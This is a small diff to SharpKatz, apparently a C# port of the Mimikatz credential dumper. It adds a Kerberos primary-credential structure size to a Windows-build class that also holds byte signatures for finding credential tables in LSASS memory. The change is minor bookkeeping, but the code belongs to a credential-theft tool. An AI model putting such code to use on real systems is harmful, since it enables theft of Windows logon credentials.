@@ -33,6 +33,7 @@ namespace SharpKatz.WinBuild
         public int KerbUnloadLogonSessionTableOffset { get; set; }
         public byte[] TSGlobalCredTableSign { get; set; }
         public int TSGlobalCredTableOffset { get; set; }
+        public int KerberosPrimaryCredentialTypeSize { get; set; }
 
         byte[] PTRN_WALL_TSGlobalCredTable = { 0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0x0d };
         byte[] PTRN_WALL_KerbUnloadLogonSessionTable = { 0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d };
@@ -51,6 +52,7 @@ namespace SharpKatz.WinBuild
             LogonSessionType = typeof(Kerberos.KIWI_KERBEROS_LOGON_SESSION_10);
             LogonSessionTypeSize = Marshal.SizeOf(typeof(Kerberos.KIWI_KERBEROS_LOGON_SESSION_10));
             KerberosPrimaryCredentialType = typeof(Kerberos.KIWI_KERBEROS_10_PRIMARY_CREDENTIAL);
+            KerberosPrimaryCredentialTypeSize = Marshal.SizeOf(typeof(Kerberos.KIWI_KERBEROS_10_PRIMARY_CREDENTIAL));
             TSCredType = typeof(Tspkg.KIWI_TS_CREDENTIAL);
 
             KerberosLogonSessionType = typeof(Kerberos.KIWI_KERBEROS_LOGON_SESSION_10);
